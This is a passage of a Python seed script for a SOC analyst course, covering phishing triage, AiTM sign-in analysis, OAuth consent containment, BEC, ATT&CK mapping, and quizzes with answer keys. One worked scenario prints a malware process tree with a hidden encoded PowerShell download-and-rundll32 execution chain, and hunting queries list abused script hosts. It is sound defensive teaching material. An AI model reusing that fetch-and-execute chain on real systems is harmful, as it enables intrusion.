- `email.subject`, `email.from.address`, `email.to.address`, `email.message_id`, `email.delivery_timestamp`
- `event.action`, `event.category`, `event.outcome`
- `network.protocol`, `destination.ip`, `destination.domain`, `tls.server.ja3s`

(`email.*` was added to ECS in 8.6; if your SIEM is on an older schema, fields differ.)

## Worked SIEM queries

KQL — Defender XDR Advanced Hunting, browser/Outlook spawning a script host:

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where InitiatingProcessFileName in~ ("outlook.exe","msedge.exe","chrome.exe","firefox.exe")
| where FileName in~ ("powershell.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
| project Timestamp, DeviceName, AccountName,
          InitiatingProcessFileName, FileName, ProcessCommandLine, ReportId
```

KQL — pivot from a confirmed-phish URL to clicks across the tenant:

```kql
let badUrl = "https://o365-secure-login.azurewebsites.net/auth";
UrlClickEvents
| where Url has badUrl
| project Timestamp, AccountUpn, ActionType, NetworkMessageId, Url, ThreatTypes
| join kind=inner (
    EmailEvents
    | project NetworkMessageId, Subject, SenderFromAddress, RecipientEmailAddress, DeliveryAction
) on NetworkMessageId
```

Lucene (ION-style) — same idea against an Elastic SIEM:

```text
event.category:process AND
process.parent.name:(outlook.exe OR msedge.exe OR chrome.exe) AND
process.name:(powershell.exe OR cmd.exe OR mshta.exe OR rundll32.exe OR regsvr32.exe)
```

## Identity side — AiTM in Entra ID sign-in logs

Microsoft Entra ID logs every sign-in. The fields that betray AiTM:

- `userPrincipalName`, `userId`
- `appDisplayName`, `appId` (e.g. `Office 365 Exchange Online`)
- `ipAddress`, `location.countryOrRegion`, `location.city`
- `deviceDetail.browser`, `deviceDetail.operatingSystem`, `deviceDetail.deviceId`
- `clientAppUsed` (`Browser`, `Mobile Apps and Desktop clients`, `IMAP4`, `POP3`)
- `authenticationDetails[].authenticationMethod` (`Password`, `Mobile app notification`, `FIDO2 security key`)
- `authenticationRequirement` (`singleFactorAuthentication` / `multiFactorAuthentication`)
- `riskState`, `riskLevelAggregated`, `riskLevelDuringSignIn`
- `riskEventTypes_v2` — `unfamiliarFeatures`, `anonymizedIPAddress`, `maliciousIPAddress`, `unlikelyTravel`, `tokenIssuerAnomaly`, `anomalousToken`, `tokenIssuedFromAnonymousIP`, `mcasFinSuspiciousInboxManipulationRules`
- `correlationId`, `sessionId` — *the latter is gold:* same session ID re-used from a new IP/UA = cookie replay.

The textbook AiTM pattern in the log:

1. Real successful interactive sign-in from the user's normal IP, MFA satisfied.
2. Within minutes, a non-interactive sign-in for the *same `sessionId`* from a different IP / country / UA, MFA `previouslySatisfied`.
3. Inbox rule creation event in the Unified Audit Log.
4. New device or auth-method registration (T1098.005).

```mermaid
sequenceDiagram
    actor U as User
    participant K as AiTM kit (reverse proxy)
    participant M as login.microsoftonline.com
    U->>K: GET /auth (clicked phishing link)
    K->>M: GET /auth (proxied)
    M-->>K: login form
    K-->>U: login form (rendered as if from M)
    U->>K: username + password
    K->>M: username + password
    M-->>K: MFA challenge
    K-->>U: MFA challenge
    U->>M: MFA approve (push)
    M-->>K: session cookie + tokens
    K->>K: STORE cookie + tokens
    K-->>U: redirect to real M365
    Note over K: Attacker replays cookie<br/>from their own host;<br/>MFA already satisfied.
```

## Identity side — Unified Audit Log events to know

- `New-InboxRule` / `Set-InboxRule` — auto-forward, move-to-RSS-Feeds, delete-on-receipt.
- `Add-MailboxPermission` — granting Full Access / Send-As to another mailbox.
- `Set-Mailbox -ForwardingSmtpAddress` — forwarding at mailbox level.
- `Add-MailboxFolderPermission` — exfil via shared folder.
- `Update application` / `Add service principal` / `Consent to application` — OAuth changes.
- `Add member to role` — privilege escalation post-takeover.

## Illicit OAuth consent grants

When a user clicks Accept on a malicious OAuth app:

1. The app appears in **Enterprise applications** in Entra ID.
2. A delegated permission grant is recorded.
3. A refresh token is issued to the app.

Risky scopes that demand immediate escalation:

- `Mail.Read`, `Mail.ReadWrite`, `Mail.Send`
- `MailboxSettings.ReadWrite` — lets the app create inbox rules without UI
- `offline_access` — refresh-token persistence
- `Files.ReadWrite.All`, `Sites.ReadWrite.All`
- `User.Read.All`, `Directory.Read.All`, `Contacts.ReadWrite`

Containment requires **revoking the app grant**, not just resetting the user's password:

```powershell
Connect-MgGraph -Scopes "Directory.Read.All","DelegatedPermissionGrant.ReadWrite.All"
$badAppId = "00000000-1111-2222-3333-444444444444"
Get-MgOauth2PermissionGrant -All |
  Where-Object ClientId -eq $badAppId |
  ForEach-Object { Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId $_.Id }
Revoke-MgUserSignInSession -UserId user@acme.com
```

## The classic post-takeover BEC pivot

The single most diagnostic post-AiTM action is creation of an **inbox rule** that:

- moves messages containing finance keywords (`invoice`, `wire`, `swift`, `ach`, `payment`, `bank`, `remit`) to *RSS Feeds* / *Conversation History* / *Archive*,
- *and* marks them read or deletes them,
- *and* optionally auto-forwards to an external address.

Hunt query (UAL):

```text
Operations:"New-InboxRule" OR "Set-InboxRule"
| where Parameters has_any ("MoveToFolder","DeleteMessage","ForwardTo","RedirectTo","MarkAsRead")
| where Parameters has_any ("invoice","wire","swift","ach","payment","bank","remit")
```

## Glossary

- **Threat Explorer / Email Entity Page / ZAP / Submissions** — the four M365 Defender screens an L1 phishing triager opens.
- **AMSI** — Antimalware Scan Interface; captures script content before execution.
- **AiTM** — adversary-in-the-middle reverse-proxy phishing kit; steals session cookies, defeats password+push MFA.
- **`sessionId`** — the gold field; same session re-used from a new IP/UA is cookie replay.
- **Risky OAuth scopes** — `Mail.*`, `MailboxSettings.ReadWrite`, `offline_access`, `Files.ReadWrite.All`, `Directory.Read.All`.

## Further reading

- Microsoft Learn — *Threat Explorer and real-time detections in Defender for Office 365*.
- Microsoft Learn — *Sign-in logs in Microsoft Entra ID* (riskEventType, riskState, conditional access result).
- Microsoft Learn — *Detect and Remediate Illicit Consent Grants*.
- Sysmon — *System Monitor* event reference.
""",
    )
    m6l3q = _add_lesson(
        session, mod6, order=6, title="Telemetry & AiTM — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on Sysmon event IDs, ECS phishing field paths, AiTM Entra ID signal reading, and OAuth consent containment.",
    )
    _add_q(session, m6l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which Sysmon event ID is most useful for confirming that a downloaded file inherited the Mark-of-the-Web Zone.Identifier alternate data stream — i.e. that Windows recognised it as Internet-zone?",
        options=[
            {"value": "ev1", "label": "Event ID 1 — Process Create"},
            {"value": "ev11", "label": "Event ID 11 — File Create"},
            {"value": "ev15", "label": "Event ID 15 — File Create Stream Hash"},
            {"value": "ev22", "label": "Event ID 22 — DNS Query"},
        ],
        correct="ev15",
        explanation_md="Event ID 15 fires when an alternate data stream is created on a file — that's specifically what records the Zone.Identifier ADS for MOTW. Event 11 is the underlying file-create; 15 is the ADS-level event that confirms the MOTW tag.",
        points=2,
    )
    _add_q(session, m6l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following indicators in Microsoft Entra ID sign-in logs together fingerprint an AiTM session-cookie replay?",
        options=[
            {"value": "samesession", "label": "The same `sessionId` value used from two different `ipAddress` values within minutes"},
            {"value": "spfpass", "label": "An SPF=pass result on the original phishing email"},
            {"value": "previously", "label": "MFA recorded as `previouslySatisfied` for the second sign-in"},
            {"value": "anonymized", "label": "`riskEventTypes_v2` containing `anonymizedIPAddress` or `tokenIssuedFromAnonymousIP`"},
            {"value": "rule", "label": "A `New-InboxRule` event in the Unified Audit Log shortly after the second sign-in"},
        ],
        correct=["samesession", "previously", "anonymized", "rule"],
        explanation_md="Same sessionId re-used from another IP, MFA previouslySatisfied, anonymised-IP risk events, and a finance-keyword inbox rule are the textbook AiTM-to-BEC fingerprint. SPF pass on the email tells you nothing about cookie theft.",
        points=3,
    )
    _add_q(session, m6l3q, order=3, kind=QuestionKind.SINGLE,
        stem_md="A user has accepted an OAuth consent prompt for an unfamiliar third-party app that requested `Mail.ReadWrite`, `Mail.Send`, and `offline_access`. The L1's manager confirms this is malicious. Which of the following is *required* to fully contain the incident?",
        options=[
            {"value": "pwdreset", "label": "Reset the user's password and force MFA re-registration"},
            {"value": "blockip", "label": "Block the source IP at the perimeter firewall"},
            {"value": "revoke_grant", "label": "Revoke the OAuth permission grant for the malicious app and revoke the user's active sign-in sessions"},
            {"value": "softdelete", "label": "Soft-delete the original phishing email tenant-wide"},
        ],
        correct="revoke_grant",
        explanation_md="Consent phishing issues a refresh token tied to the OAuth grant — independent of the user's password. Resetting the password leaves the malicious app fully functional. The grant itself must be removed, and active sessions revoked.",
        points=2,
    )
    _add_q(session, m6l3q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="In Elastic Common Schema, hash-bearing fields for phishing follow-on can live on `file.hash.sha256`, `process.hash.sha256`, *and* `process.parent.hash.sha256` simultaneously, depending on whether the indicator describes a file at rest, a running process, or the parent of a process.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** ECS exposes hash fields on every entity that can carry one — `file`, `process`, and `process.parent` are all valid match targets. A complete IOC join on a file hash typically queries all three.",
        points=2,
    )

    # Lesson 6.4 — Reporting pipeline, decision framework, ATT&CK + worked scenarios
    m6l4 = _add_lesson(
        session, mod6, order=7,
        title="Reporting pipeline, decision framework, ATT&CK, and worked scenarios",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Walk a user-reported phishing report through the standard L1 pipeline — confirm, scope mail-trace, pull from inboxes, IOC-block, hunt 7-day window
> 2. Apply a defensible *escalate / contain / close* decision using the ION L1 decision framework
> 3. Draw the line between L1 containment authority and L2 territory
> 4. Map a phishing-driven incident to the relevant MITRE ATT&CK techniques (T1566 family, T1539, T1098.005, T1114.003, T1656)
> 5. Walk three end-to-end worked scenarios — AiTM credential phish with token theft, HTML-smuggling → ISO → LNK → loader, and BEC vendor-invoice-redirect

## The user-reported phishing pipeline

Reporting tools the L1 will encounter:

- **Microsoft Report Message / Report Phishing** — built-in Outlook button.
- **PhishER (KnowBe4)** — orchestration; auto-tags, runs YARA, integrates with VT/Hybrid Analysis.
- **Cofense Reporter / Triage / Vision** — equivalent stack.
- **Custom button + shared mailbox** — `phishing@yourcorp.com`. Cheaper, more FPs, no automation.

### Queue triage SLA (illustrative — replace with your runbook's numbers)

- High-volume burst (same subject ≥ 5 reports in 10 min) — investigate within 15 minutes.
- Single user report from a privileged account or VIP — within 30 minutes.
- Standard single user report — within 4 business hours.
- Bulk advertising / non-malicious — close at end-of-shift batch.

### False-positive categories (most user-reports are these)

- Newsletters and marketing the user opted into.
- Internal mail with unfamiliar branding (a new HR system, a new SaaS rollout).
- Cold sales outreach.
- Calendar invites from external partners.
- Mail through a forwarder that broke SPF/DKIM (auth-fail tells, real content).
- Genuine M365 / Google service notifications.

### Confirmed-phish workflow

1. **Scope the spread.** Mail-trace the sender / subject / URL / attachment hash across the tenant. Note all recipients and delivery locations.
2. **Pull from inboxes.** Soft-delete first, hard-delete if approved.

   ```powershell
   New-ComplianceSearch -Name "Phish-2026-04-28" `
     -ExchangeLocation All `
     -ContentMatchQuery 'subject:"Action required: M365 password expires today" AND from:notify@*.azurewebsites.net'
   Start-ComplianceSearch -Identity "Phish-2026-04-28"
   New-ComplianceSearchAction -SearchName "Phish-2026-04-28" -Purge -PurgeType SoftDelete
   ```

3. **Affected user containment** (only if confirmed click / cred entry / token issue):
   - Revoke active sessions: `Revoke-MgUserSignInSession`.
   - Force password reset.
   - Force MFA re-registration.
   - Check inbox rules, forwarding rules, recent mailbox permission changes.
   - Check OAuth grants; revoke any unfamiliar.
   - Check `MFA methods` for newly added authenticators.
4. **IOC pivot.** Domain → block at email gateway, web proxy, DNS, EDR custom IOC. Sender → tenant-allow-block list. URL → block at proxy / CASB / Safe Links; submit to Microsoft. File hash → block in EDR. Sender IP — cautiously (shared infra).
5. **Threat-hunt sweep** for any other recipients who clicked / authenticated, in the 7-day window before and after delivery.
6. **Submit to vendors** for global signal: Microsoft Submissions, Google's Report phishing, urlscan/abuse.ch (within OPSEC limits — see Lesson 6.2).
7. **Close-out artefacts captured:** original `.eml`, headers, attachment hashes, screenshots of landing page, summary of containment actions, notification to affected user.

```mermaid
flowchart TD
    C[Confirmed phish] --> S[Scope mail-trace<br/>tenant-wide]
    S --> P[Pull from inboxes<br/>soft-delete]
    P --> CB[Block IOCs:<br/>domain / URL / hash / sender]
    CB --> U{User clicked?}
    U -->|No| R[Report-back to user,<br/>close]
    U -->|Yes| RV[Revoke sessions,<br/>force pwd + MFA reset]
    RV --> O[Check OAuth grants,<br/>inbox rules,<br/>forwarding,<br/>MFA methods]
    O --> H[Hunt 7-day window<br/>for related activity]
    H --> SUB[Submit to Microsoft / Google,<br/>abuse.ch / VT (OPSEC-aware)]
    SUB --> CLOSE[Close ticket with<br/>artefacts attached]
```

## The triage decision framework

A junior analyst's job is to make a *defensible* decision quickly. Three outcomes:

- **Close — benign.** Marketing, newsletter, internal mail flagged, false positive.
- **Confirm phish — contained at gateway, no click.** Quarantine + block + close + report-back.
- **Escalate to L2.** Real click, real auth, real cred entry, real malware execution, BEC suspected, or scope > 1 user.

Decision inputs the L1 must collect:

- *Was it delivered?* (Threat Explorer / Message Trace)
- *Where did it land?* (Inbox / Junk / Quarantine)
- *Is it still there?* (or has ZAP / TRAP already pulled it)
- *Did anyone click?* (UrlClickEvents / proxy logs)
- *Did anyone authenticate?* (Entra ID sign-in logs)
- *Did anything execute?* (EDR process tree)
- *Who else got it?* (mail-trace, scope)
- *Is the recipient privileged or VIP?*
- *What is the lure asking for?* (cred / payment / file / OAuth)

```mermaid
flowchart TD
    A[New phishing alert / report] --> B{Delivered to a mailbox?}
    B -->|No: blocked at gateway| C[Verify, log, close]
    B -->|Yes| D{Anyone clicked?}
    D -->|No| E[Soft-delete, IOC block, report-back, close]
    D -->|Yes| F{Did they authenticate?}
    F -->|No| G[Containment: revoke sessions,<br/>monitor, soft-delete]
    F -->|Yes| H{Successful sign-in<br/>from anomalous IP?}
    H -->|No| I[Force pwd reset,<br/>monitor 24h]
    H -->|Yes| J[Escalate to L2:<br/>AiTM suspected]
    A --> K{Lure category}
    K -->|BEC / financial| L{Wire requested?}
    L -->|Yes| M[Escalate to fraud + L2]
    L -->|No| N[Block sender, monitor]
    K -->|Consent / OAuth| O{Grant accepted?}
    O -->|Yes| P[Escalate L2 — revoke grant]
    O -->|No| Q[User-train, block app]
```

### Escalation criteria — escalate to L2 if any of:

- Successful sign-in attributable to the lure (AiTM token theft).
- OAuth consent granted to an unfamiliar app.
- EDR alert fires from a process descended from `outlook.exe` or a browser.
- Inbox / forwarding rule created in the same window as a suspicious sign-in.
- Multiple recipients (≥ 3 in the default policy) clicked.
- VIP / executive / privileged-account recipient interacted.
- BEC pattern detected (financial verb + lookalike domain + reply-to swap + outgoing thread).
- Anything novel (no IOC matches, no template matches in past 30 days).

### L1 containment authority (typical, configurable)

- Soft-delete confirmed phish across inboxes via Compliance Search / TRAP / PhishRIP.
- Add IOC to email gateway and proxy block lists.
- Force password reset / MFA re-registration / sign-out for *one* affected user.
- Disable a user account temporarily.
- Submit to Microsoft / Google.

### L2 territory — do not action without escalation

- Mailbox forensics (recovery of pre-purge content, contents of inbox rules, journaling).
- OAuth grant revocation (privilege required + tenant-wide impact).
- Threat-hunt sweep across 30+ days / multiple data sources / multiple users.
- Coordinated takedown requests (registrar / hosting provider).
- Fraud-team handoff for confirmed BEC with attempted wire transfer.
- Legal hold / preservation if litigation likely.

## MITRE ATT&CK mapping

ATT&CK Enterprise techniques the analyst should be able to cite:

### Initial Access (TA0001)
- **T1566 Phishing** — parent.
  - **T1566.001 Spearphishing Attachment**
  - **T1566.002 Spearphishing Link**
  - **T1566.003 Spearphishing via Service** — LinkedIn DM, Twitter DM, Discord, Teams external chat.
  - **T1566.004 Spearphishing Voice** — vishing.

### Resource Development (TA0042)
- **T1583 Acquire Infrastructure** — `.001` Domains (typosquats), `.006` Web Services (Azure Web Apps, Cloudflare Workers, GitHub Pages, Vercel).
- **T1585 Establish Accounts** — `.002` Email Accounts.

### Defense Evasion (TA0005)
- **T1656 Impersonation** — display-name, brand impersonation.
- **T1036 Masquerading** — extensions, icons, signed binaries.
- **T1027.006 HTML Smuggling**.

### Credential Access (TA0006)
- **T1056 Input Capture** — landing-page credential theft.
- **T1539 Steal Web Session Cookie** — AiTM.
- **T1621 MFA Request Generation** — push bombing.

### Persistence (TA0003)
- **T1098.005 Device Registration** — adversary registers their own device for MFA / Conditional Access bypass.
- **T1556 Modify Authentication Process**.
- **T1136 Create Account** — guest in Entra ID.

### Collection (TA0009)
- **T1114 Email Collection** — `.001` Local, `.002` Remote, **`.003` Email Forwarding Rule** — the BEC textbook persistence/exfil.

### Command and Control (TA0011) — when click leads to follow-on malware
- **T1071 Application Layer Protocol** — `.001` Web, `.004` DNS.
- **T1102 Web Service**, **T1573 Encrypted Channel**.

The analyst should be able to read an alert title like *"Suspicious inbox rule creation following anomalous sign-in"* and immediately map it to **T1539 → T1098.005 → T1114.003** — the AiTM-to-BEC pivot.

## Worked scenario A — O365 credential phish via AiTM kit

**Initial alert.** Defender XDR fires *"Anomalous sign-in followed by inbox rule creation"* for `alex.bennett@acme.com`. Risk: High.

**Step 1 — pull the sign-in.** Two events for Alex:

- 09:14 UTC, IP `198.51.100.10` (London — Alex's normal), Edge / Win11, MFA satisfied via Authenticator push, `riskLevelDuringSignIn=low`.
- 09:21 UTC, IP `185.220.101.7` (Tor exit, `anonymizedIPAddress`), Chrome / Linux, MFA `previouslySatisfied`, **same `sessionId` as the 09:14 event**, `riskEventTypes_v2=[anonymizedIPAddress, anomalousToken]`, `riskLevelDuringSignIn=high`.

**Step 2 — trace the email.** Threat Explorer for previous 24h, recipient `alex.bennett`. One delivered message: subject *"Action Required: your Microsoft 365 password expires in 24 hours"*, sender `notify@m365-secure-tenant.azurewebsites.net`, delivered Inbox at 09:11. Safe Links rewrote the URL to `https://safelinks.protection.outlook.com/?url=https%3A%2F%2Fm365-secure-tenant.azurewebsites.net%2Fauth%3Frid%3DBENN-A1B2`. The `rid=BENN-A1B2` is a per-victim token — *do not submit to public scanners.*

**Step 3 — confirm the click.** UrlClickEvents shows `ClickAllowed` at 09:13, NetworkMessageId matches.

**Step 4 — confirm the AiTM.** The 09:14 successful sign-in *immediately* followed the 09:13 click. Authentication-Method shows `Password` then `Mobile app notification` — user typed creds into the kit, kit relayed to Microsoft, Microsoft pushed real MFA, user approved, kit captured the cookie. **Confirmed.**

**Step 5 — confirm post-takeover action.** UAL filtered for `alex.bennett`:

- 09:21 — `New-InboxRule`, `Name="."`, `MoveToFolder="RSS Feeds"`, `BodyContainsWords="invoice,wire,swift,payment,remit"`, `MarkAsRead=true`.
- 09:22 — `Update user` adding a new authenticator method on a different deviceId.

**Step 6 — escalate to L2.** Confirmed AiTM with token theft + persistence + collection rule. Out of L1 authority for full remediation.

L1 containment actions before handover: revoke sessions; block sender domain at gateway; submit to Microsoft; soft-delete the lure tenant-wide; search mail-trace for the `rid=*-*` token format. L2 picks up: forensic mailbox dump, OAuth grant review, expanded user-cohort hunt, fraud check on Alex's recent outbound, takedown to Microsoft Azure abuse.

ATT&CK chain: **T1566.002 → T1539 → T1098.005 → T1114.003**.

## Worked scenario B — HTML smuggling → ISO → LNK → loader

**Initial alert.** EDR fires *"PowerShell launched from LNK in mounted ISO"* on `WS-FIN-014` (Priya Patel).

**Step 1 — process tree.**

```
explorer.exe (PID 5120)
  └─ msedge.exe (PID 7204)            [chrome download initiated]
      └─ explorer.exe (mount ISO, PID 8801)
           └─ Invoice_Q1_2026.lnk → cmd.exe (PID 9120)
               └─ powershell.exe -nop -w hidden -enc <base64>
                    └─ rundll32.exe %TEMP%\\xy.dll,Start
```

The base64-decoded PowerShell does an `Invoke-WebRequest` to `https://cdn-acme-billing[.]com/upd.dll`, drops `%TEMP%\\xy.dll`, `rundll32`s it.

**Step 2 — back to the browser.** msedge.exe download history shows `Invoice_Q1_2026.html` from `https://acme-billing-portal.com/inv?id=PRIYA-93FA`. The HTML is 412 KB (large for an invoice page); `<script>` block contains a base64 blob and `Blob` + `msSaveOrOpenBlob` calls — classic HTML smuggling.

**Step 3 — back to the email.** Mail-trace for Priya: 11:42 UTC, sender `accounts@acme-billing-portal.com`, subject *"Q1 2026 invoice — overdue"*, delivered Inbox. Click telemetry shows `ClickAllowed` on the URL at 11:44.

**Step 4 — auth check.** SPF for `acme-billing-portal.com` — passes for `203.0.113.42` (attacker owns the domain; SPF on attacker domain is unhelpful as a signal). DKIM `d=acme-billing-portal.com` — passes. DMARC alignment — passes. *But:* `acme-billing-portal.com` is a 4-day-old domain (passive DNS). The real vendor is `acme.com`. **Combosquat.**

**Step 5 — IOCs and pivot.** Domain `acme-billing-portal.com`, `cdn-acme-billing.com`. URL `https://acme-billing-portal.com/inv?id=*` — strip the per-victim token before public submission. SHA-256 of the HTML, ISO, and `xy.dll`. Network connection to `cdn-acme-billing.com` from `WS-FIN-014`.

**Step 6 — scope and escalate.** Mail-trace shows three other Finance users got variants. EDR query for `process.parent.name:explorer.exe AND process.command_line:*Invoice_Q1*lnk` returns one match (Priya's host) — only Priya executed. Containment: isolate `WS-FIN-014` via EDR, soft-delete the four emails, block both domains at proxy/DNS/EDR, submit hashes to TI.

ATT&CK chain: **T1566.002 → T1027.006 (HTML smuggling) → T1204.002 (User Execution: Malicious File) → T1059.001 (PowerShell) → T1218.011 (Rundll32)**.

## Worked scenario C — BEC vendor invoice redirect (no malware)

**Initial alert.** Finance flags an email to AP from `mike.harris@acme.com`, subject *"Updated banking details for our 2026 contract"*. AP is suspicious — Mike normally emails the buyer side, not AP.

**Step 1 — open the headers.**

```text
From: "Mike Harris" <mike.harris@acme.com>
Reply-To: "Mike Harris" <mike.harris.acme@gmail.com>
Return-Path: <bounces@acme-corp-finance.com>
Received: from acme-corp-finance.com (mail.acme-corp-finance.com [203.0.113.99])
 by mx.acme-supplier.example with ESMTPS; Mon, 27 Apr 2026 14:02:15 +0000
Authentication-Results: spf=pass smtp.mailfrom=acme-corp-finance.com;
 dkim=pass header.d=acme-corp-finance.com;
 dmarc=fail action=quarantine header.from=acme.com;
 compauth=fail reason=001
```

Three findings:

1. SPF and DKIM **pass for `acme-corp-finance.com`**, *not* for `acme.com`. Attacker owns this domain.
2. DMARC for `acme.com` — `fail action=quarantine` because `header.from=acme.com` does not align with any passing auth identity. Microsoft applied `quarantine`, but a tenant Allow rule let it through (common: AP allow-listed `*acme*` years ago).
3. **Reply-To swap** — visible From is `mike.harris@acme.com` but Reply-To is `mike.harris.acme@gmail.com`. Replies go to Gmail.

**Step 2 — confirm lookalike.** `acme.com` is the legitimate vendor. `acme-corp-finance.com` is 11 days old per WHOIS. No prior mail-flow history.

**Step 3 — body content.**

> Hi team — please update our remit-to information on file before the next payment run. New details are attached. We've changed banks; please process Tuesday's invoice (PO-44910) to the new account. Confidential, do not discuss with the buyer side, this is being handled at director level.

The combination — new banking details + urgency + secrecy + reply-to swap + 11-day-old lookalike — is BEC vendor-invoice-redirect with very high confidence.

**Step 4 — check whether any payment has gone out.** Mail-trace and AP system: no wire issued yet (next run Tuesday).

**Step 5 — verify out of band.** Phone Mike on the number AP has on file (not the number in the email signature). Mike confirms he sent no such email. The address is forged.

**Step 6 — escalate to L2 / fraud.** L1 actions: tenant-block `acme-corp-finance.com`, soft-delete from AP inboxes (and any cc'd), submit to Microsoft, search mail-trace for the same sender pattern across the org. Notify the real `acme.com` security contact (their domain is being abused).

ATT&CK chain: **T1583.001 (lookalike domain) → T1656 (impersonation) → T1566.002 → attempted T1657 (financial theft)**.

## Glossary

- **PhishRIP / TRAP / ZAP** — vendor names for the same primitive: post-delivery pull from inboxes after verdict change.
- **Compliance Search + Purge** — Microsoft 365 mechanism for soft- or hard-deleting a message tenant-wide.
- **L1 authority vs L2 territory** — soft-delete and single-user containment vs forensic, OAuth-grant, threat-hunt-sweep work.
- **`rid=` per-victim token** — the OPSEC tell that says *strip before public submission* in URL reputation work.

## Further reading

- MITRE ATT&CK Enterprise Matrix — Initial Access, Defense Evasion, Credential Access, Persistence, Collection.
- Microsoft Learn — *Submit messages to Microsoft for analysis* (Submissions API).
- Microsoft Learn — *Search-Mailbox / New-ComplianceSearch reference* — note: `Search-Mailbox` is being phased out in favour of compliance-portal workflows; verify against the current Microsoft Learn doc.
""",
    )
    m6l4q = _add_lesson(
        session, mod6, order=8, title="Decision framework, ATT&CK & scenarios — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on L1-vs-L2 authority, ATT&CK chain mapping, BEC red-flag combinations, and the confirmed-phish workflow order.",
    )
    _add_q(session, m6l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L1 investigates a phishing alert and finds: the user clicked the link, authenticated successfully, the sign-in was from an anonymised IP, and an inbox rule moving messages with `wire` / `invoice` / `swift` to RSS Feeds was created two minutes later. Which is the correct *next* action?",
        options=[
            {"value": "close", "label": "Close as benign — the user authenticated successfully so the sign-in is legitimate"},
            {"value": "pwd_only", "label": "Force a password reset and close the ticket"},
            {"value": "escalate", "label": "Escalate to L2 — confirmed AiTM with cookie theft and post-takeover BEC persistence rule"},
            {"value": "ban_ip", "label": "Block the user's home IP at the firewall and monitor"},
        ],
        correct="escalate",
        explanation_md="Click + auth + anomalous IP + finance-keyword inbox rule is the textbook AiTM-to-BEC fingerprint. Mailbox forensics, OAuth grant review, and tenant-wide hunt are L2 territory. L1 contains (revoke sessions, soft-delete the lure, IOC-block) and hands over.",
        points=2,
    )
    _add_q(session, m6l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *L1 containment authority* in a typical SOC, vs L2 territory?",
        options=[
            {"value": "softdel", "label": "Soft-delete the confirmed-phish email tenant-wide via Compliance Search"},
            {"value": "ioc_block", "label": "Add the sender domain to the email gateway and proxy block lists"},
            {"value": "revoke_sessions", "label": "Force password reset and revoke active sign-in sessions for one affected user"},
            {"value": "oauth_revoke", "label": "Revoke the OAuth permission grant of a malicious enterprise application across the tenant"},
            {"value": "forensic", "label": "Recover pre-purge mailbox content for a 30-day retroactive forensic dump"},
        ],
        correct=["softdel", "ioc_block", "revoke_sessions"],
        explanation_md="Tenant-wide soft-delete, IOC blocking, and single-user session/credential containment are typical L1 authority. Tenant-wide OAuth grant revocation (high blast radius) and pre-purge mailbox forensics (legal/privacy weight) are L2 territory.",
        points=3,
    )
    _add_q(session, m6l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="Map the AiTM-to-BEC pivot — *(a) cookie theft on the landing page → (b) attacker registers their own device for MFA → (c) attacker creates an inbox rule auto-forwarding finance threads* — to the right ATT&CK techniques in order.",
        options=[
            {"value": "wrong1", "label": "T1566.001 → T1098.001 → T1114.001"},
            {"value": "right", "label": "T1539 → T1098.005 → T1114.003"},
            {"value": "wrong2", "label": "T1056 → T1556 → T1102"},
            {"value": "wrong3", "label": "T1621 → T1136 → T1567"},
        ],
        correct="right",
        explanation_md="Cookie theft is **T1539** (Steal Web Session Cookie). Adversary device registration for MFA bypass is **T1098.005**. Auto-forwarding inbox rule for BEC is **T1114.003** (Email Forwarding Rule).",
        points=2,
    )
    _add_q(session, m6l4q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="In a BEC investigation an analyst sees: `From: mike.harris@acme.com`, `Reply-To: mike.harris.acme@gmail.com`, `Return-Path: bounces@acme-corp-finance.com`, DMARC fails for `acme.com` but a tenant Allow rule let the message through, and the body asks for a banking-details change. Beyond the auth signal, what is the single most diagnostic header-level red flag a junior analyst should learn to spot? (Two or three words.)",
        options=None,
        correct=["reply-to swap", "reply to swap", "reply-to mismatch", "reply to mismatch"],
        explanation_md="The `Reply-To` swap diverts replies to an attacker-controlled address while the visible `From` looks legitimate. It survives auth alignment because DMARC does not check Reply-To, and it is what turns a phishing email into an active BEC conversation.",
        points=2,
    )

    # ── Module 7 — Escalation Workflow ───────────────────────────────────
    # How an L1 hands work off cleanly: the escalate/contain/close decision,
    # severity + priority frameworks, the multi-team escalation topology,
    # the handover packet, chain of custody, communication discipline,
    # external regulatory clocks, and three worked scenarios that cascade
    # into 9+ escalation paths.
    mod7 = _add_module(
        session, course, order=7,
        title="Escalation Workflow",
        description_md=(
            "Handing work off cleanly. The cost calculus of false vs missed "
            "escalation, triage timeboxing and SLA tiers, severity + "
            "priority + blast-radius classification, the L1 escalation "
            "paths (L2 / IR / Identity / IT / Legal / HR / CISO / "
            "MSSP / CERT / regulator / law enforcement), the handover "
            "packet template (with good and bad examples), chain of "
            "custody and RFC 3227 order of volatility, communication "
            "discipline (the 3-line update + cadence by severity), "
            "external reporting timelines (GDPR Art.33 / NIS2 / SEC "
            "8-K / HIPAA), national CERT and ISAC relationships, ION "
            "case-state conventions, and three worked scenarios."
        ),
        estimated_minutes=210,
    )

    # Lesson 7.1 — Discipline + the L1 decision + timeboxing
    m7l1 = _add_lesson(
        session, mod7, order=1,
        title="The escalation decision: cost calculus, criteria, and timeboxing",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Articulate the *two opposing failure modes* of an L1 — false escalation and missed escalation — and reason about the cost of each
> 2. Apply the *escalate / contain / close* decision to a concrete alert using the default escalation criteria
> 3. Distinguish *contain-and-close* candidates from *escalate* candidates and avoid the "when in doubt, escalate everything" anti-pattern
> 4. Use SLA tiers as escalation triggers, not just measurement targets
> 5. Tell *stuck-because-of-authority* apart from *stuck-because-of-skill* and apply the right response to each
>
